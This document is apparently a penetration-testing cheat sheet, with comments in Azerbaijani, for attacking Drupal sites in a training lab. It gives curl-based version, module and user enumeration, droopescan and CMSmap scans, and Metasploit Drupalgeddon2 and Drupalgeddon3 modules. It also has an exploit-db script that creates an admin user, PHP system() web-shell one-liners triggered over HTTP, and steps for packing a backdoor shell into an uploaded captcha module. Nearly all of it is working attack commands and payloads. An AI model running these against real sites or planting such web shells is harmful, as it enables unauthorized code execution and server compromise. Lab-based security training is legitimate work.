# Drupal Enumeration
```powershell
curl -s http://drupal.inlanefreight.local | grep Drupal

curl -s https://target.com/robots.txt
# Tipik Drupal robots.txt:
# Disallow: /core/
# Disallow: /profiles/
# Disallow: /sites/
```

# Version Enumeration
```powershell
curl -s https://target.com/CHANGELOG.txt | head -10

curl -s https://target.com/core/CHANGELOG.txt | head -10

curl -s https://target.com/install.php | grep -i drupal

curl -s https://target.com/node/1 | grep -i drupal

curl -s https://target.com | grep "misc/drupal.js"
```


# Critical Files
```powershell
# Login
https://target.com/user/login
https://target.com/user

# Admin panel
https://target.com/admin
https://target.com/admin/config
https://target.com/admin/modules
https://target.com/admin/appearance
https://target.com/admin/people

# Həssas fayllar
https://target.com/CHANGELOG.txt
https://target.com/core/CHANGELOG.txt
https://target.com/sites/default/settings.php
https://target.com/sites/default/settings.php.bak
https://target.com/xmlrpc.php
https://target.com/cron.php
```

# Active Enumeration with DROOPESCAN
```powershell
# Quraşdırma
pip install droopescan
# və ya
git clone https://github.com/SamJoan/droopescan
cd droopescan && pip install -r requirements.txt

# Əsas scan
droopescan scan drupal --url https://target.com

# Thread ilə sürətli scan
droopescan scan drupal --url https://target.com --threads 20

# Verbose
droopescan scan drupal --url https://target.com -v

# JSON output
droopescan scan drupal --url https://target.com \
            --output-format json > report.json
```

# Enumeration with CMSmap
```powershell
# Quraşdırma
git clone https://github.com/Dionach/CMSmap
pip install .

# Scan
cmsmap https://target.com

# Exploit yoxlama
cmsmap https://target.com -e
```

# MSFCONSOLE drupalgeddon
```powershell
msfconsole
# Drupalgeddon2 (CVE-2018-7600)
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS target.com
set TARGETURI /
run

# Drupalgeddon3 (CVE-2018-7602)
use exploit/unix/webapp/drupal_restws_unserialize
set RHOSTS target.com
run
```

# DrupalGeddon
```powershell
https://www.exploit-db.com/exploits/34992

python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

# DrupalGeddon 2
```powershell
curl -s http://drupal-dev.inlanefreight.local/hello.txt

<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>

echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```

# Module Enumeration
```powershell
# Modullar /modules/ qovluğunda
curl -s https://target.com/modules/
curl -s https://target.com/sites/all/modules/

# Modul mövcudluğunu yoxla
for mod in views token pathauto ctools date; do
  code=$(curl -o /dev/null -s -w "%{http_code}" \
         https://target.com/modules/$mod/)
  echo "$mod: $code"
done

# Modul versiyası
curl -s https://target.com/modules/<modul_adi>/<modul_adi>.info
curl -s https://target.com/modules/<modul_adi>/README.txt
```

# User Enumeration
```powershell
# User ID ilə profil
curl -s https://target.com/user/1
curl -s https://target.com/user/2

# JSON:API ilə (Drupal 8.5+)
curl -s https://target.com/jsonapi/user/user

# Node enumeration
curl -s https://target.com/node/1
curl -s https://target.com/node/1?_format=json

# JSON:API node
curl -s https://target.com/jsonapi/node/article
curl -s https://target.com/jsonapi/node/page

# REST session token
curl -s https://target.com/rest/session/token
```
---
<img width="898" height="587" alt="image" src="https://github.com/user-attachments/assets/b31da2bd-9305-4489-985f-87e45de18906" />


# Remote Code Execution
```powershell
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);?>

curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"


wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
Administration > Reports > Available updates
```
<img width="903" height="447" alt="image" src="https://github.com/user-attachments/assets/a6248930-3fea-49c0-9ae2-b154b615a4a1" />
---

# Uploading Backdoor Module
```powershell
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

tar xvf captcha-8.x-1.2.tar.gz

shell.php
<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);?>

curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

